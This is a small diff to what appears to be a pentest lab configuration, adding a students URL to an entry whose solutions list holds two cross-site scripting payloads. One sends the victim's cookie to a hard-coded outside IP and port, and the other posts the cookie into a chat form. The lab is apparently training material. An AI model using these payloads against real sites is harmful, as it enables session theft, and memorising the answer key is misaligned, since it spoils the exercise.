@@ -9,6 +9,8 @@
 :keys:
   - "xaver sebastian"
   - "xaver sebastian schmidt"
+:students:
+  - http://mail.#PENTESTLAB-DOMAIN#/admin
 :solutions:
   - <script>document.write("<img src='http://172.23.42.70:1337/"+document.cookie+"' />")</script>
   - <script>if (!localStorage["donotsend"]){ document.getElementById("message").value=document.cookie;document.getElementById("chat").submit();localStorage["donotsend"] = true}</script>
